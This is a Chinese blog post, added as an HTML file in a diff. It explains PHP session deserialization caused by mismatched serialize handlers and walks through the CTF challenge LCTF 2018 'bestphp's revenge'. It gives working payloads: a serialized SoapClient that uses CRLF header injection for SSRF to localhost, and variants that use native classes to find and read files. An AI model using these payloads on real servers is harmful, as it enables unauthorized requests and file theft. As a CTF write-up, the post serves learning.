@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Session反序列化与php原生类应用 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="当用户首次访问一个服务器，如果该服务器开启了Session（使用Seesion_start()函数开启），服务器将生成一个唯一PHPSESSID，同时创建一个以sess_PHPSESSID命名的文件用于存储会话信息。并在HTTP响应中通过 ..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Session反序列化与php原生类应用</h2>
+            <div class="post-date">2022-11-30</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/session-fan-xu-lie-hua-yu-php-yuan-sheng-lei-ying-yong.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p>当用户首次访问一个服务器，如果该服务器开启了Session（使用Seesion_start()函数开启），服务器将生成一个唯一PHPSESSID，同时创建一个以<code>sess_PHPSESSID</code>命名的文件用于存储会话信息。并在HTTP响应中通过  <code>Set-cookie:PHPSESSID</code>  将PHPSESSID发送给用户。当用户再次访问时<code>Session_start()</code>函数就不会再去分配一个新的PHPSESSID，而是在服务器中去寻找以<code>sess_PHPSESSID</code>命名的文件，将文件保存的序列化信息进行反序列化并读出。</p>
+<!-- more -->
+<h1 id="导致session反序列化攻击的原因">导致session反序列化攻击的原因：</h1>
+<p>PHP内置了多种处理器用于存储$_SESSION数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：<br>
+<img src="https://dydydy123.github.io/post-images/1669810991668.png" alt="" loading="lazy"><br>
+当序列化和反序列化所使用的处理器不同，就可能产生反序列化漏洞。<br>
+默认处理器是php，可通过配置session.serialize_handler选项,来设置序列化及反序列化时使用的处理器。</p>
+<pre><code>ini_set('session.serialize_handler', 'php_serialize');
+</code></pre>
+<p>当序列化时使用php_serialize处理器，反序列化时使用php处理器将产生问题。<br>
+<strong>php_serialize处理器序列化</strong></p>
+<pre><code>&lt;?php
+//使用php_serialize处理器序列化
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+$_SESSION['test']='|O:4:&quot;test&quot;:1:{s:1:&quot;s&quot;;s:10:&quot;helloworld&quot;;}';
+</code></pre>
+<p><strong>php_serialize处理器序列化后的数据</strong></p>
+<pre><code>a:1:{s:4:&quot;test&quot;;s:42:&quot;|O:4:&quot;test&quot;:1:{s:1:&quot;s&quot;;s:10:&quot;helloworld&quot;;}&quot;;}
+</code></pre>
+<p><strong>php处理器反序列化</strong><br>
+将|前的字符串当键名|后的字符串当需要反序列化的字符串，反序列化后的数据：</p>
+<pre><code>array(1) {
+  [&quot;a:1:{s:4:&quot;test&quot;;s:42:&quot;&quot;]=&gt;
+  object(__PHP_Incomplete_Class)#1 (2) {
+    [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;
+    string(4) &quot;test&quot;
+    [&quot;s&quot;]=&gt;
+    string(10) &quot;helloworld&quot;
+  }
+}
+</code></pre>
+<h1 id="soapclientcrlf进行ssrf">SoapClient+crlf进行SSRF</h1>
+<p><strong>SoapClient原生类介绍：</strong><br>
+SoapClient采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p>
+<pre><code>class SoapClient {
+    /* Methods */
+    public __construct(?string $wsdl, array $options = [])
+    public __call(string $name, array $args): mixed
+    public __doRequest(
+        string $request,
+        string $location,
+        string $action,
+        int $version,
+        bool $oneWay = false
+    ): ?string
+    public __getCookies(): array
+    public __getFunctions(): ?array
+    public __getLastRequest(): ?string
+    public __getLastRequestHeaders(): ?string
+    public __getLastResponse(): ?string
+    public __getLastResponseHeaders(): ?string
+    public __getTypes(): ?array
+    public __setCookie(string $name, ?string $value = null): void
+    public __setLocation(?string $location = null): ?string
+    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool
+    public __soapCall(
+        string $name,
+        array $args,
+        ?array $options = null,
+        SoapHeader|array|null $inputHeaders = null,
+        array &amp;$outputHeaders = null
+    ): mixed
+}
+</code></pre>
+<p>在新建一个SoapClient的类对象的时候，需要有两个参数，一个是字符串形式的wsdl，另一个是数组形式的options。</p>
+<pre><code>public __construct(?string $wsdl, array $options = [])
+第一个参数是用来指明是否是wsdl模式，如果为`null`，那就是非wsdl模式。
+第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location为目标服务器的URL，而uri 是SOAP服务的目标命名空间。
+
+</code></pre>
+<p>通常情况下我们会让目标服务器去反序列化我们构造好的SoapClient类，然后调用一个该类中不存在的方法，以此来执行SoapClient类的__call方法使目标服务器发送HTTP请求到我们构造SoapClient类时传入的location来完成ssrf。<br>
+<strong>[LCTF 2018]bestphp's revenge复现：</strong><br>
+<strong>网站源码：</strong></p>
+<pre><code>&lt;?php
+highlight_file(__FILE__);
+$b = 'implode';
+call_user_func($_GET['f'], $_POST);
+session_start();
+if (isset($_GET['name'])) {
+    $_SESSION['name'] = $_GET['name'];
+}
+var_dump($_SESSION);
+$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
+call_user_func($b, $a);
+?&gt;
+</code></pre>
+<p>可通过<code>call_user_func()</code>设置session.serialize_handler为php_serialize处理器。</p>
+<pre><code>call_user_func(&quot;session_start&quot;,array(&quot;serialize_handler&quot;,&quot;php_serialize&quot;));
+</code></pre>
+<p>可通过<code>$_SESSION['name'] = $_GET['name'];</code>来控制需要反序列化的数据。</p>
+<p><strong>flag.php:</strong><br>
+直接访问flag.php，提示需要本地访问， 可通过SoapClient进行ssrf</p>
+<pre><code>only localhost can get flag!session_start();
+echo 'only localhost can get flag!';
+$flag = 'LCTF{*************************}';
+if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){
+       $_SESSION['flag'] = $flag;
+   }
+only localhost can get flag!
+
+</code></pre>
+<p><strong>SoapClient ssrf payload:</strong></p>
+<pre><code>$soapClient = new SoapClient(null,array(
+'location' =&gt; 'http://127.0.0.1/flag.php',
+'user_agent' =&gt; &quot;ua\r\nCookie:PHPSESSID=dr070uad9oc4j1encvf4dncn14\r\n&quot;, 'uri' =&gt; 'test'));
+var_dump(&quot;|&quot;.urlencode(serialize($soapClient)));
+</code></pre>
+<p><img src="https://dydydy123.github.io/post-images/1669818090295.png" alt="" loading="lazy"><br>
+先将构造好的序列化后的SoapClient通过<code>php_serialize</code>处理器存入服务器的<code>sess_PHPSESSID</code>文件中。当我们再次带上相同<code>PHPSESSID</code>直接访问时该网站时，服务器使用默认php处理器将该文件内容进行反序列化，赋值给$_SESSION。</p>
+<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1669818697640.png" alt="" loading="lazy"></figure>
+<p>接下来该去调用SoapClient类不存在的方法来触发__call方法，发送HTTP请求到http://127.0.0.1/flag.php该请求应该带上我们的<code>PHPSESSID</code>这样获取的flag就存入了我们的<code>$_SESSION</code>中。</p>
+<p><img src="https://dydydy123.github.io/post-images/1669863695893.png" alt="" loading="lazy"><br>
+这里f传入extract进行变量覆盖，name传入SoapClient ，post传入b=call_user_func，那么这样call_user_func($b, $a);就变成了call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，那么这里就变成了调用SoapClient类中不存在的welcome_to_the_lctf2018方法从而去触发_call方法发起soap请求进行ssrf。</p>
+<p>最后带上<code>PHPSESSID</code>直接访问时该网站，获取$_SESSION。<br>
+<img src="https://dydydy123.github.io/post-images/1669863797986.png" alt="" loading="lazy"></p>
+<p><strong>利用原生类找文件与读文件。</strong></p>
+<pre><code>&lt;?php
+    
+// $a = new SoapClient(null,array('location' =&gt; 'http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*', 'user_agent' =&gt; &quot;111\r\nCookie: PHPSESSID=c9urdtg4kjp5jl36mrl44qlsah&quot;, 'uri' =&gt; 'test'));
+
+$a = new SoapClient(null,array('location' =&gt; 'http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg', 'user_agent' =&gt; &quot;111\r\nCookie: PHPSESSID=c9urdtg4kjp5jl36mrl44qlsah&quot;, 'uri' =&gt; 'test'));
+$b = serialize($a);
+echo '|'.urlencode($b);
+
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/commonscollections5/">
+                  <h3 class="post-title">
+                    CommonsCollections5
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
